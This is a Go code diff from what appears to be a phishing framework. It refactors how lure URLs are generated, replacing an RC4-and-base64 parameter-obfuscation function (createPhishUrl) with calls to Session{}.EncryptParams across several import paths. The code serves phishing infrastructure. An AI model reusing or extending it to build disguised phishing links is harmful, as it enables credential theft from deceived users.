@@ -2,14 +2,11 @@ package core
 
 import (
 	"bufio"
-	"crypto/rc4"
-	"encoding/base64"
 	"encoding/csv"
 	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
-	"math/rand"
 	"net/url"
 	"os"
 	"path/filepath"
@@ -837,7 +834,6 @@ func (t *Terminal) handleLures(args []string) error {
 				var phish_params []map[string]string
 				var out string
 
-				params := url.Values{}
 				if pn > 2 {
 					if args[2] == "import" {
 						if pn < 4 {
@@ -875,6 +871,7 @@ func (t *Terminal) handleLures(args []string) error {
 
 					} else {
 						// params present
+						params := make(map[string]string)
 						for n := 2; n < pn; n++ {
 							val := args[n]
 
@@ -884,15 +881,14 @@ func (t *Terminal) handleLures(args []string) error {
 							}
 							k := val[:sp]
 							v := val[sp+1:]
-
-							params.Add(k, v)
+							params[k] = v
 
 							log.Info("adding parameter: %s='%s'", k, v)
 						}
-						phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
+						phish_urls = append(phish_urls, base_url + Session{}.EncryptParams(params))
 					}
 				} else {
-					phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
+					phish_urls = append(phish_urls, base_url)
 				}
 
 				for n, phish_url := range phish_urls {
@@ -1623,7 +1619,6 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 					continue
 				}
 
-				params := url.Values{}
 				map_params := make(map[string]string)
 				for _, val := range args {
 					sp := strings.Index(val, "=")
@@ -1633,13 +1628,11 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 					}
 					k := val[:sp]
 					v := val[sp+1:]
-
-					params.Add(k, v)
 					map_params[k] = v
 				}
 
-				if len(params) > 0 {
-					ret = append(ret, t.createPhishUrl(base_url, &params))
+				if len(map_params) > 0 {
+					ret = append(ret, base_url + Session{}.EncryptParams(map_params))
 					ret_params = append(ret_params, map_params)
 				}
 			}
@@ -1659,14 +1652,12 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 				continue
 			}
 
-			item := url.Values{}
 			map_params := make(map[string]string)
 			for n, param := range params {
-				item.Add(param_names[n], param)
 				map_params[param_names[n]] = param
 			}
-			if len(item) > 0 {
-				ret = append(ret, t.createPhishUrl(base_url, &item))
+			if len(map_params) > 0 {
+				ret = append(ret, base_url + Session{}.EncryptParams(map_params))
 				ret_params = append(ret_params, map_params)
 			}
 		}
@@ -1687,18 +1678,16 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 		}
 
 		for _, json_params := range params_json {
-			item := url.Values{}
 			map_params := make(map[string]string)
 			for k, v := range json_params {
 				if val, ok := v.(string); ok {
-					item.Add(k, val)
 					map_params[k] = val
 				} else {
 					log.Error("json parameter '%s' value must be of type string", k)
 				}
 			}
-			if len(item) > 0 {
-				ret = append(ret, t.createPhishUrl(base_url, &item))
+			if len(map_params) > 0 {
+				ret = append(ret, base_url + Session{}.EncryptParams(map_params))
 				ret_params = append(ret_params, map_params)
 			}
 		}
@@ -1833,30 +1822,6 @@ func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phis
 	}
 
 	return nil
-}
-
-func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
-	var ret string = base_url
-	if len(*params) > 0 {
-		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))
-
-		enc_key := GenRandomAlphanumString(8)
-		dec_params := params.Encode()
-
-		var crc byte
-		for _, c := range dec_params {
-			crc += byte(c)
-		}
-
-		c, _ := rc4.NewCipher([]byte(enc_key))
-		enc_params := make([]byte, len(dec_params)+1)
-		c.XORKeyStream(enc_params[1:], []byte(dec_params))
-		enc_params[0] = crc
-
-		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
-		ret += "?" + key_arg + "=" + key_val
-	}
-	return ret
 }
 
 func (t *Terminal) sprintVar(k string, v string) string {
